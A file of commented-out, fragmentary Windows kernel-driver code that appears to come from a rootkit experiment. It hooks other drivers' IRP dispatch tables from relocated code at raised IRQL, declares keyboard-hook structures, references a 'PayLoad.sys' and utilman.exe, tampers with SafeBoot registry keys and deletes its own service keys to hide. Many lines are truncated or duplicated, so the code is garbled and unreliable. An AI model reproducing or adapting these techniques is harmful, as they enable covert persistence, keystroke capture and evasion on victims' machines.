////UNICODE_STRING uDirToOpen;
//RtlInitUnicodeString(&uFakeDrvName, L"\\Driver\\FakeDriver1");
//RtlInitUnicodeString(&uFakeDevName, L"\\Device\\FakeDevice1");
////RtlInitUnicodeString(&uHookDrvName, L"\\FileSystem\\FltMgr");
//RtlInitUnicodeString(&uHookDrvName, L"\\Driver\\acpi");
////RtlInitUnicodeString(&uDirToOpen, L"\\")
//ntStatus = IoCreateDriver(&uFakeDrvName, FakeDriverEntry);
//if (!NT_SUCCESS(ntStatus)){
//	DbgPrint("Failed to create fake driver object!");
//	return ntStatus;
//}
//g_pFakeDrvObj->DriverInit = NULL;
//g_pFakeDrvObj->DriverStart = NULL;
//g_pFakeDrvObj->DriverExtension = NULL;

//ntStatus = IoCreateDevice(g_pFakeDrvObj, 0, &uFakeDevName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &g_pFakeDevObj);
//if (!NT_SUCCESS(ntStatus)){
//	DbgPrint("Failed to create fake device!");
//	return ntStatus;
//}

//ntStatus = ObReferenceObjectByName(&uHookDrvName,
//	OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
//	NULL,
//	0,
//	*IoDriverObjectType,
//	KernelMode,
//	NULL,
//	&pHookDrvObj);
//if (!NT_SUCCESS(ntStatus)){
//	DbgPrint("Couldn open ntfs driver");
//	return ntStatus;
//}

//ntStatus = ObReferenceObjectByName(&uHookDrvName,
//	OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
//	NULL,
//	0,
//	*IoDriverObjectType,
//	KernelMode,
//	NULL,
//	&pHookDrvObj);
//if (!NT_SUCCESS(ntStatus)){
//	DbgPrint("Couldn open ntfs driver");
//	return ntStatus;
//}

//for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++){
//	pDriverObject->MajorFunction[i] = MyGenericDispatchPassDown;
//}

//DbgPrint("Filled dispatch table with generic pass down routine...\n");

////Explicitly fill in the IRP's we want to hook   
//pDriverObject->MajorFunction[IRP_MJ_INTERNAL_DEVICE_CONTROL] = DispatchRead;
//

//RtlInitUnicodeString(&nameUsbStor, L"\\Driver\\USBSTOR");
//status = ObReferenceObjectByName(&nameUsbStor, OBJ_CASE_INSENSITIVE, NULL, (ACCESS_MASK)0L, *IoDriverObjectType, KernelMode, NULL, &DriverObject);
//if (NT_SUCCESS(status))
//{
//	// request to know number of devices in USBSTOR
//	status = (gFuncTbl.EnumerateDeviceObjectList)(DriverObject, NULL, 0, &numDevices);

//ULONG numDevObj = 0;
//PVOID pDevListMemory = ExAllocatePool(NonPagedPool, 4096);
//ntStatus = IoEnumerateDeviceObjectList(pHookDrvObj, pDevListMemory, 4096, &numDevObj);
//if (STATUS_SUCCESS != ntStatus){
//	DbgPrint("Enumerate error");
//}
//
//for (ULONG i = 0; i < numDevObj; i++){
//	//IoAttachDeviceToDeviceStackSafe(g_pFakeDevObj, (PDEVICE_OBJECT)(((PULONGLONG)pDevListMemory)[i]), &g_pAttachedToDevobj);
//	DbgPrint("DriverObject of device %d at %llX", i, ((PDEVICE_OBJECT)(((PULONGLONG)pDevListMemory)[i]))->DriverObject);
//}

//DbgPrint("%d device objects have been found to be attached to ntfs driver", numDevObj);
//ULONGLONG myLoadImageNotifyRoutineOffset = (PUCHAR)MyLoadImageNotifyRoutine - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
//ULONGLONG myIrpMjCreateOffset = (PUCHAR)MyIrpMjCreate - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
//ULONGLONG myIrpMjShutdownOffset = (PUCHAR)MyIrpMjShutdown - ((PUCHAR)pDriverObject->DriverStart + TEXTOFFSET);
//((void)(*)) fpNewmemPrepOnBoot = ((void)(*))
//	void(*fpNewmemPrepOnBoot)(void) = 
//PLOAD_IMAGE_NOTIFY_ROUTINE fpNewmemMyLoadImageNotifyRoutine = (PLOAD_IMAGE_NOTIFY_ROUTINE)(g_pNewMemory + myLoadImageNotifyRoutineOffset);
//PDRIVER_DISPATCH fpNewmemMyIrpMjCreate = (PDRIVER_DISPATCH)(g_pNewMemory + myIrpMjCreateOffset);
//PDRIVER_DISPATCH fpNewmemMyIrpMjShutdown = (PDRIVER_DISPATCH)(g_pNewMemory + myIrpMjShutdownOffset);


//PsCreateSystemThread(&hThread, (ACCESS_MASK)0, NULL, (HANDLE)0, NULL, (PKSTART_ROUTINE)fpNewmemMyWorkerThread, NULL);

////PsSetLoadImageNotifyRoutine((PLOAD_IMAGE_NOTIFY_ROUTINE)fpNewmemMyLoadImageNotifyRoutine);

//fpNewmemMyLoadImageNotifyRoutine = NULL;
//fpNewmemMyIrpMjShutdown = NULL;
//fpNewmemMyIrpMjCreate = NULL;


//PWORK_QUEUE_ITEM pMyWorkItem2 = (PWORK_QUEUE_ITEM)ExAllocatePool(NonPagedPool, sizeof(WORK_QUEUE_ITEM));

//PWORK_ITEM_ARRAY pMyWorkItemArray;
//pMyWorkItemArray->pWorkItem1 = pMyWorkItem1;
//pMyWorkItemArray->pWorkItem2 = pMyWorkItem2;

//PWORK_QUEUE_ITEM pMyWorkItemArray[2] = { pMyWorkItem1, pMyWorkItem2 };
//WORK_QUEUE_ITEM myWorkItem;
//((PULONGLONG)pNonPagedPool)[0] = 
//PVOID_ROUTINE fpPrepRoutines[2] = ()
//PVOID pNonPagedPool = ExAllocatePool(NonPagedPool, 16);
//PVOID pNonPagedPool2 = ExAllocatePool(NonPagedPool, 16);
//PVOID pNonPagedPool2 = ExAllocatePool(NonPagedPool, 16);
//ExInitializeWorkItem(pMyWorkItem2, (PWORKER_THREAD_ROUTINE)fpNewmemMyWorkerThread, pNonPagedPool2);
//pMyWorkItem->WorkerRoutine = (PWORKER_THREAD_ROUTINE)fpNewmemMyWorkerThread;
//DbgPrint("%llX", fpNewmemMyIrpMjCreate);
//KIRQL oldIrql;
//PULONGLONG pNonPagedPool2 = (PULONGLONG)ExAllocatePool(NonPagedPool, 16);
//
//	//g_OldIrpMjCreate = (PDRIVER_DISPATCH)0xDEADDEADDEADDEAD;
//KeRaiseIrql(HIGH_LEVEL, &oldIrql);
////	((PULONGLONG)pNonPagedPool)[0] = (PULONGLONG)((PDRIVER_DISPATCH)pHookDrvObj->MajorFunction[IRP_MJ_CREATE]);
////	((PULONGLONG)pNonPagedPool)[1] = (PULONGLONG)((PDRIVER_DISPATCH)pHookDrvObj->MajorFunction[IRP_MJ_SHUTDOWN]);
//	//pNonPagedPool[0] = (ULONGLONG)((PDRIVER_DISPATCH)pHookDrvObj->MajorFunction[IRP_MJ_CREATE]);
//	//pNonPagedPool[0] = (ULONGLONG)((PDRIVER_DISPATCH)pHookDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL]);
//pHookDrvObj->DriverStartIo = (PDRIVER_STARTIO)pNonPagedPool2;
//	//g_OldIrpMjCreate = pHookDrvObj->MajorFunction[IRP_MJ_CREATE];
//	//pHookDrvObj->MajorFunction[IRP_MJ_CREATE] = fpNewmemMyIrpMjCreate;
//	//pHookDrvObj->MajorFunction[IRP_MJ_SHUTDOWN] = fpNewmemMyIrpMjShutdown;
//	//pHookDrvObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = fpNewmemMyIrpMjShutdown;
//KeLowerIrql(oldIrql);
//NTSTATUS FakeDriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pszRegistryPath){
//	UNREFERENCED_PARAMETER(pszRegistryPath);
//	//UNREFERENCED_PARAMETER(pDriverObject);
//	g_pFakeDrvObj = pDriverObject;
//	DbgPrint("Fake driver object created!");
//	return STATUS_SUCCESS;
//}
//


//NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pszRegistryPath);

//NTSTATUS IoCreateDriver(IN PUNICODE_STRING DriverName OPTIONAL, IN PDRIVER_INITIALIZE InitializationFunction);
//NTSTATUS FakeDriverEntry(IN PDRIVER_OBJECT pDriverObject, IN PUNICODE_STRING pszRegistryPath);

//TODO: obreferenceobjectbyname with fileobjecttype, try to open C:\\extend.

//#include <intrin.h>

//stypedef PVOID(*PVOID_ROUTINE)(void);
//typedef VOID_ROUTINE* PVOID_ROUTINE;

//void MyLoadImageNotifyRoutine(PUNICODE_STRING pFullImageName, HANDLE hPid, PIMAGE_INFO pImageInfo);
//NTSTATUS MyGenericDispatchPassDown(PDEVICE_OBJECT pLowerDeviceObject, PIRP pIrp);
//NTSTATUS MyIrpMjCreate(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
//NTSTATUS MyIrpMjShutdown(PDEVICE_OBJECT pDeviceObject, PIRP pIrp);
//PDRIVER_DISPATCH g_OldIrpMjCreate;

//BOOL mystrcmp(const WCHAR* prefix, WCHAR* testStr, ULONG lengthGiven, PARSEMETHOD parseMethod);
//#pragma warning(disable:4055)
//PWORK_QUEUE_ITEM pItem = (PWORK_QUEUE_ITEM)pStartContext;
//DbgPrint("pItem->Parameter = 0x%llX", pItem->Parameter);
//DbgPrint("0x%llX, 0x%llX", ((PULONGLONG)pItem->Parameter)[0], ((PULONGLONG)pItem->Parameter)[1]);
//PKSTART_ROUTINE fpPrepOnBoot = (PKSTART_ROUTINE)(((PULONGLONG)((PWORK_QUEUE_ITEM)pStartContext)->Parameter)[0]);
//DbgPrint("0x%llX", fpPrepOnBoot);
//fpPrepOnBoot(NULL);
//PVOID_ROUTINE fpPrepOnBoot = (PVOID_ROUTINE)((PULONGLONG)((PWORK_QUEUE_ITEM)pStartContext)->Parameter)[0];
//PKSTART_ROUTINE fpPrepOnBoot = (PKSTART_ROUTINE)((PWORK_QUEUE_ITEM)pStartContext)->Parameter;
//((PVOID_ROUTINE)((PWORK_QUEUE_ITEM)pStartContext)->Parameter);
//DbgPrint("in initthread: 0x%llX", fpPrepOnBoot);
//MmGetSystemRoutineAddress
//fpPrepOnBoot();
//OBJECT_ATTRIBUTES objectAttributes;
//InitializeObjectAttributes(&objectAttributes, NULL, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//fpPrepOnBoot(NULL);
//((PKSTART_ROUTINE)(((PULONGLONG)pStartContext)[0]))(NULL);
//((PVOID_ROUTINE)(((PULONGLONG)pStartContext)[1]));
//else if (TRUE == mystrcmp(L"utilman.exe", pProcessName->Buffer, pProcessName->Length, METHOD_END)){

//#include <ndis.h>
//#include <tdi.h>
//PHOOK_EXTENSION g_pKbdHookData;
//void ConvertScanCodeToKeyCode(PKEY_DATA pKData, char* keyArray);

//}
//WCHAR szDrvFilePath[] = L"\\??\\C:\\PayLoad.sys";
//WCHAR szSafebootData1[] = L"DiskDrive";
//WCHAR szSafebootData2[] = L"Volume";
//WCHAR szSafebootRegPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\";

//WCHAR szFakeRegPathMinimal1[SAFEBOOT_KEY_LENGTH];
//WCHAR szFakeRegPathNetwork1[SAFEBOOT_KEY_LENGTH];
//WCHAR szFakeRegPathMinimal2[SAFEBOOT_KEY_LENGTH];
//WCHAR szFakeRegPathNetwork2[SAFEBOOT_KEY_LENGTH];
//WCHAR szTrueRegPathMinimal1[SAFEBOOT_KEY_LENGTH];
//WCHAR szTrueRegPathNetwork1[SAFEBOOT_KEY_LENGTH];
//WCHAR szTrueRegPathMinimal2[SAFEBOOT_KEY_LENGTH];
//WCHAR szTrueRegPathNetwork2[SAFEBOOT_KEY_LENGTH];

//wcscat_s(szFakeRegPathMinimal1, sizeof(szFakeRegPathMinimal1) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szFakeRegPathMinimal1, sizeof(szFakeRegPathMinimal1) / sizeof(WCHAR), L"Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10319}");
//wcscat_s(szFakeRegPathNetwork1, sizeof(szFakeRegPathNetwork1) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szFakeRegPathNetwork1, sizeof(szFakeRegPathNetwork1) / sizeof(WCHAR), L"Network\\{4D36E967-E325-11CE-BFC1-08002BE10319}");
//wcscat_s(szFakeRegPathMinimal2, sizeof(szFakeRegPathMinimal2) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szFakeRegPathMinimal2, sizeof(szFakeRegPathMinimal2) / sizeof(WCHAR), L"Minimal\\{71A27CDD-812A-11D0-BEC7-08002BE2092E}");
//wcscat_s(szFakeRegPathNetwork2, sizeof(szFakeRegPathNetwork2) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szFakeRegPathNetwork2, sizeof(szFakeRegPathNetwork2) / sizeof(WCHAR), L"Network\\{71A27CDD-812A-11D0-BEC7-08002BE2092E}");
//wcscat_s(szTrueRegPathMinimal1, sizeof(szTrueRegPathMinimal1) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szTrueRegPathMinimal1, sizeof(szTrueRegPathMinimal1) / sizeof(WCHAR), L"Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10318}");
//wcscat_s(szTrueRegPathNetwork1, sizeof(szTrueRegPathNetwork1) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szTrueRegPathNetwork1, sizeof(szTrueRegPathNetwork1) / sizeof(WCHAR), L"Network\\{4D36E967-E325-11CE-BFC1-08002BE10318}");
//wcscat_s(szTrueRegPathMinimal2, sizeof(szTrueRegPathMinimal2) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szTrueRegPathMinimal2, sizeof(szTrueRegPathMinimal2) / sizeof(WCHAR), L"Minimal\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}");
//wcscat_s(szTrueRegPathNetwork2, sizeof(szTrueRegPathNetwork2) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szTrueRegPathNetwork2, sizeof(szTrueRegPathNetwork2) / sizeof(WCHAR), L"Network\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}");


//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szTrueRegPathMinimal1, NULL, REG_SZ, szSafebootData1, sizeof(szSafebootData1));
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szTrueRegPathNetwork1, NULL, REG_SZ, szSafebootData1, sizeof(szSafebootData1));
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szTrueRegPathMinimal2, NULL, REG_SZ, szSafebootData2, sizeof(szSafebootData2));
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szTrueRegPathNetwork2, NULL, REG_SZ, szSafebootData2, sizeof(szSafebootData2));
//
//RtlInitUnicodeString(&uSafebootRegPath, szFakeRegPathMinimal1);
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//ZwDeleteKey(hKey);

//RtlInitUnicodeString(&uSafebootRegPath, szFakeRegPathNetwork1);
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//ZwDeleteKey(hKey);

//RtlInitUnicodeString(&uSafebootRegPath, szFakeRegPathMinimal2);
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//ZwDeleteKey(hKey);

//RtlInitUnicodeString(&uSafebootRegPath, szFakeRegPathNetwork2);
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//ZwDeleteKey(hKey);
//NTSTATUS ntStatus;
//OBJECT_ATTRIBUTES objectAttributes;
//HANDLE hKey;
//WCHAR szSafebootData1[] = L"DiskDrive";
//WCHAR szSafebootData2[] = L"Volume";
//WCHAR szSafebootRegPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\";

//WCHAR szFakeRegPathMinimal1[SAFEBOOT_KEY_LENGTH];
//WCHAR szFakeRegPathNetwork1[SAFEBOOT_KEY_LENGTH];
//WCHAR szFakeRegPathMinimal2[SAFEBOOT_KEY_LENGTH];
//WCHAR szFakeRegPathNetwork2[SAFEBOOT_KEY_LENGTH];
//WCHAR szTrueRegPathMinimal1[SAFEBOOT_KEY_LENGTH];
//WCHAR szTrueRegPathNetwork1[SAFEBOOT_KEY_LENGTH];
//WCHAR szTrueRegPathMinimal2[SAFEBOOT_KEY_LENGTH];
//WCHAR szTrueRegPathNetwork2[SAFEBOOT_KEY_LENGTH];

//wcscat_s(szFakeRegPathMinimal1, sizeof(szFakeRegPathMinimal1) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szFakeRegPathMinimal1, sizeof(szFakeRegPathMinimal1) / sizeof(WCHAR), L"Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10319}");
//wcscat_s(szFakeRegPathNetwork1, sizeof(szFakeRegPathNetwork1) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szFakeRegPathNetwork1, sizeof(szFakeRegPathNetwork1) / sizeof(WCHAR), L"Network\\{4D36E967-E325-11CE-BFC1-08002BE10319}");
//wcscat_s(szFakeRegPathMinimal2, sizeof(szFakeRegPathMinimal2) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szFakeRegPathMinimal2, sizeof(szFakeRegPathMinimal2) / sizeof(WCHAR), L"Minimal\\{71A27CDD-812A-11D0-BEC7-08002BE2092E}");
//wcscat_s(szFakeRegPathNetwork2, sizeof(szFakeRegPathNetwork2) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szFakeRegPathNetwork2, sizeof(szFakeRegPathNetwork2) / sizeof(WCHAR), L"Network\\{71A27CDD-812A-11D0-BEC7-08002BE2092E}");
//wcscat_s(szTrueRegPathMinimal1, sizeof(szTrueRegPathMinimal1) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szTrueRegPathMinimal1, sizeof(szTrueRegPathMinimal1) / sizeof(WCHAR), L"Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10318}");
//wcscat_s(szTrueRegPathNetwork1, sizeof(szTrueRegPathNetwork1) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szTrueRegPathNetwork1, sizeof(szTrueRegPathNetwork1) / sizeof(WCHAR), L"Network\\{4D36E967-E325-11CE-BFC1-08002BE10318}");
//wcscat_s(szTrueRegPathMinimal2, sizeof(szTrueRegPathMinimal2) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szTrueRegPathMinimal2, sizeof(szTrueRegPathMinimal2) / sizeof(WCHAR), L"Minimal\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}");
//wcscat_s(szTrueRegPathNetwork2, sizeof(szTrueRegPathNetwork2) / sizeof(WCHAR), szSafebootRegPath);
//wcscat_s(szTrueRegPathNetwork2, sizeof(szTrueRegPathNetwork2) / sizeof(WCHAR), L"Network\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}");

//InitializeObjectAttributes(&objectAttributes, &uDrvRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

//RtlInitUnicodeString(&uSafebootRegPath, szSafebootRegPathMinimal);


//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szFakeRegPathMinimal1, NULL, REG_SZ, szSafebootData1, sizeof(szSafebootData1));
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szFakeRegPathNetwork1, NULL, REG_SZ, szSafebootData1, sizeof(szSafebootData1));
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szFakeRegPathMinimal2, NULL, REG_SZ, szSafebootData2, sizeof(szSafebootData2));
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, szFakeRegPathNetwork2, NULL, REG_SZ, szSafebootData2, sizeof(szSafebootData2));

////ntStatus = ZwOpenKey(&hKey, DELETE, &objectAttributes);
////ntStatus = ZwDeleteKey(hKey);

//RtlInitUnicodeString(&uSafebootRegPath, szTrueRegPathMinimal1);
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//ZwDeleteKey(hKey);

//RtlInitUnicodeString(&uSafebootRegPath, szTrueRegPathNetwork1);
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//ZwDeleteKey(hKey);

//RtlInitUnicodeString(&uSafebootRegPath, szTrueRegPathMinimal2);
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//ZwDeleteKey(hKey);

//RtlInitUnicodeString(&uSafebootRegPath, szTrueRegPathNetwork2);
//InitializeObjectAttributes(&objectAttributes, &uSafebootRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//ZwDeleteKey(hKey);

//WCHAR rawStr[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\";
//WCHAR value1[108];
//WCHAR value2[108];
//WCHAR value3[108];
//WCHAR value4[108];
//WCHAR value5[108];
//WCHAR value6[108];
//WCHAR value7[108];
//WCHAR value8[108];
//wcscat_s(value1, sizeof(value1) / sizeof(WCHAR), rawStr);
//wcscat_s(value1, sizeof(value1) / sizeof(WCHAR), L"Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10319}");
//wcscat_s(value2, sizeof(value2) / sizeof(WCHAR), rawStr);
//wcscat_s(value2, sizeof(value2) / sizeof(WCHAR), L"Network\\{4D36E967-E325-11CE-BFC1-08002BE10319}");
//wcscat_s(value3, sizeof(value3) / sizeof(WCHAR), rawStr);
//wcscat_s(value3, sizeof(value3) / sizeof(WCHAR), L"Minimal\\{71A27CDD-812A-11D0-BEC7-08002BE2092E}");
//wcscat_s(value4, sizeof(value4) / sizeof(WCHAR), rawStr);
//wcscat_s(value4, sizeof(value4) / sizeof(WCHAR), L"Network\\{71A27CDD-812A-11D0-BEC7-08002BE2092E}");
//wcscat_s(value5, sizeof(value5) / sizeof(WCHAR), rawStr);
//wcscat_s(value5, sizeof(value5) / sizeof(WCHAR), L"Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10318}");
//wcscat_s(value6, sizeof(value6) / sizeof(WCHAR), rawStr);
//wcscat_s(value6, sizeof(value6) / sizeof(WCHAR), L"Network\\{4D36E967-E325-11CE-BFC1-08002BE10318}");
//wcscat_s(value7, sizeof(value7) / sizeof(WCHAR), rawStr);
//wcscat_s(value7, sizeof(value7) / sizeof(WCHAR), L"Minimal\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}");
//wcscat_s(value8, sizeof(value8) / sizeof(WCHAR), rawStr);
//wcscat_s(value8, sizeof(value8) / sizeof(WCHAR), L"Network\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}");

//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, value5, NULL, REG_SZ, szSafeBootData1, sizeof(szSafeBootData1));
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, value6, NULL, REG_SZ, szSafeBootData1, sizeof(szSafeBootData1));
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, value7, NULL, REG_SZ, szSafeBootData2, sizeof(szSafeBootData2));
//RtlWriteRegistryValue(RTL_REGISTRY_ABSOLUTE, value8, NULL, REG_SZ, szSafeBootData2, sizeof(szSafeBootData2));


//RtlInitUnicodeString(&uServiceRegPath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\drvtriks");
//InitializeObjectAttributes(&objectAttributes, &uServiceRegPath, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

//NTSTATUS ntStatus = ZwOpenKey(&hServiceKey, DELETE, &objectAttributes);
//DbgPrint("%lX", ntStatus);
////if (!NT_SUCCESS(status)){
////	DbgPrint("a fail occurred. 0x%lX", status);
////}
//ntStatus = ZwDeleteKey(hServiceKey);
//DbgPrint("%lX", ntStatus);

//HANDLE hKey;
//UNICODE_STRING uKeyName;
//RtlInitUnicodeString(&uKeyName, value1);
//InitializeObjectAttributes(&objectAttributes, &uKeyName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//ZwDeleteKey(hKey);

//RtlInitUnicodeString(&uKeyName, value2);
//InitializeObjectAttributes(&objectAttributes, &uKeyName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//ZwDeleteKey(hKey);

//RtlInitUnicodeString(&uKeyName, value3);
//InitializeObjectAttributes(&objectAttributes, &uKeyName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//ZwDeleteKey(hKey);

//RtlInitUnicodeString(&uKeyName, value4);
//InitializeObjectAttributes(&objectAttributes, &uKeyName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//ZwOpenKey(&hKey, KEY_ALL_ACCESS, &objectAttributes);
//ZwDeleteKey(hKey);

//UNREFERENCED_PARAMETER(pStartContext);
//LARGE_INTEGER interval;
////NTSTATUS status;
//interval.QuadPart = -10000000;

//HANDLE hKey1;
//OBJECT_ATTRIBUTES objectAttributes1;
////HANDLE hKey2;
//OBJECT_ATTRIBUTES objectAttributes2;
////HANDLE hKey3;
//OBJECT_ATTRIBUTES objectAttributes3;

////HANDLE hKey4;
//OBJECT_ATTRIBUTES objectAttributes4;

//UNICODE_STRING uRegPath1;
//RtlInitUnicodeString(&uRegPath1, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\passthrough\\Instances\\passthrough");
//UNICODE_STRING uRegPath2;
//RtlInitUnicodeString(&uRegPath2, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\passthrough\\Instances");
//UNICODE_STRING uRegPath3;
////RtlInitUnicodeString(&uRegPath3, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\passthrough");
//RtlInitUnicodeString(&uRegPath3, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\drvtricks");

//UNICODE_STRING uRegPath4;
//RtlInitUnicodeString(&uRegPath4, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services");

///////InitializeObjectAttributes(&KeyAttributes, &CfgPath, OBJ_CASE_INSENSITIVE, NULL
////	, NULL);
////Status = ZwOpenKey(&KeyHandle, KEY_READ, &KeyAttributes);

////timer wait(2s)


////Buffer contains \Registry\Machine\Software\Microsoft\Windows
////	NT\CurrentVersion\Ports

//InitializeObjectAttributes(&objectAttributes1, &uRegPath1, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//InitializeObjectAttributes(&objectAttributes2, &uRegPath2, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//InitializeObjectAttributes(&objectAttributes3, &uRegPath3, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
//InitializeObjectAttributes(&objectAttributes4, &uRegPath4, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

//KeDelayExecutionThread(KernelMode, FALSE, &interval);
//status = ZwOpenKey(&hKey1, DELETE, &objectAttributes1);
//if (!NT_SUCCESS(status)){
//	DbgPrint("a fail1 occurred. 0x%lX", status);
//}
//else{
//	status = ZwDeleteKey(hKey1);
//	if (!NT_SUCCESS(status)){
//		DbgPrint("another fail1 occurred. 0x%lX", status);
//	}
//	status = STATUS_SUCCESS;
//}
//status = ZwOpenKey(&hKey2, DELETE, &objectAttributes2);
//if (!NT_SUCCESS(status)){
//	DbgPrint("a fail2 occurred. 0x%lX", status);
//}
//else{
//	status = ZwDeleteKey(hKey2);
//	if (!NT_SUCCESS(status)){
//		DbgPrint("another fail2 occurred. 0x%lX", status);
//	}
//	status = STATUS_SUCCESS;
//}
//status = ZwOpenKey(&hKey3, DELETE, &objectAttributes3);
//if (!NT_SUCCESS(status)){
//	DbgPrint("a fail3 occurred. 0x%lX", status);
//}
//else{
//	status = ZwDeleteKey(hKey3);
//	if (!NT_SUCCESS(status)){
//		DbgPrint("another fail3 occurred. 0x%lX", status);
//	}
//	//else{
//	//	status = ZwOpenKey(&hKey4, DELETE, &objectAttributes4);
//	//	if (!NT_SUCCESS(status)){
//	//		DbgPrint("a fail4 occurred. 0x%lX", status);
//	//	}
//	//	else{
//	//		status = ZwFlushKey(hKey4);
//	//		if (!NT_SUCCESS(status)){
//	//			DbgPrint("another fail4 occurred. 0x%lX", status);
//	//		}
//	//		status = STATUS_SUCCESS;
//	//	}
//	//}
//	//status = STATUS_SUCCESS;

//}





//status = ZwOpenKey(&hKey2, DELETE, &objectAttributes2);
//if (!NT_SUCCESS(status)){
//	DbgPrint("a fail occurred. 0x%lX", status);
